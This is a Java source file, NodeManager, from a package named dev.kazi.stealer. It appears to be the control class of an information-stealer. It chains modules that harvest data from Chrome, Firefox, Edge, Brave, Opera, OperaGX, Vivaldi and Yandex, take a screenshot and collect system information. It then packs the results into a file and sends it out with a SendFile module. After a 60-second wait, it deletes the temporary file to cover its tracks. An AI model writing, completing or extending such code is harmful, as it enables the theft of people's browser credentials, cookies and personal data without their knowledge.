package dev.kazi.stealer.node;

import java.io.IOException;
import java.util.ArrayList;
import dev.kazi.stealer.node.nodes.file.DeleteFile;
import dev.kazi.stealer.node.nodes.file.SendFile;
import dev.kazi.stealer.node.nodes.file.MoveFile;
import dev.kazi.stealer.node.nodes.impl.browser.Yandex;
import dev.kazi.stealer.node.nodes.impl.browser.Vivaldi;
import dev.kazi.stealer.node.nodes.impl.browser.OperaGX;
import dev.kazi.stealer.node.nodes.impl.browser.Opera;
import dev.kazi.stealer.node.nodes.impl.browser.Firefox;
import dev.kazi.stealer.node.nodes.impl.browser.Edge;
import dev.kazi.stealer.node.nodes.impl.browser.Chrome;
import java.util.List;
import dev.kazi.stealer.node.nodes.impl.browser.Brave;
import dev.kazi.stealer.node.nodes.file.CreateFile;
import dev.kazi.stealer.node.nodes.impl.Screenshot;
import dev.kazi.stealer.node.nodes.impl.Properties;
import dev.kazi.stealer.node.nodes.impl.Information;

public class NodeManager {

    private Information information;
    private Process process;
    private Properties properties;
    private Screenshot screenshot;
    private CreateFile createFile;
    private Brave brave;
    public List<Node> nodes;
    private Chrome chrome;
    private Edge edge;
    private Firefox firefox;
    private Opera opera;
    private OperaGX operagx;
    private Vivaldi vivaldi;
    private Yandex yandex;
    private MoveFile moveFile;
    private SendFile sendFile;
    private DeleteFile tempFile;
    
    public NodeManager() {
        this.nodes = new ArrayList<Node>();
    }
    
    public void start() throws InterruptedException, IOException {
        this.properties = new Properties();
        this.screenshot = new Screenshot();
        this.createFile = new CreateFile();
        this.brave = new Brave();
        this.chrome = new Chrome();
        this.edge = new Edge();
        this.firefox = new Firefox();
        this.opera = new Opera();
        this.operagx = new OperaGX();
        this.vivaldi = new Vivaldi();
        this.yandex = new Yandex();
        this.information = new Information();
        this.moveFile = new MoveFile();
        this.sendFile = new SendFile();
        Thread.sleep(60000L);
        this.tempFile = new DeleteFile();
    }
    
    public void launch() throws InterruptedException {
        try {
            this.start();
        }
        catch (final IOException ex) {}
        this.nodes.add(this.properties);
        this.nodes.add(this.screenshot);
        this.nodes.add(this.createFile);
        this.nodes.add(this.brave);
        this.nodes.add(this.chrome);
        this.nodes.add(this.edge);
        this.nodes.add(this.firefox);
        this.nodes.add(this.opera);
        this.nodes.add(this.operagx);
        this.nodes.add(this.vivaldi);
        this.nodes.add(this.yandex);
        this.nodes.add(this.information);
        this.nodes.add(this.moveFile);
        this.nodes.add(this.sendFile);
        this.nodes.add(this.tempFile);
    }
}
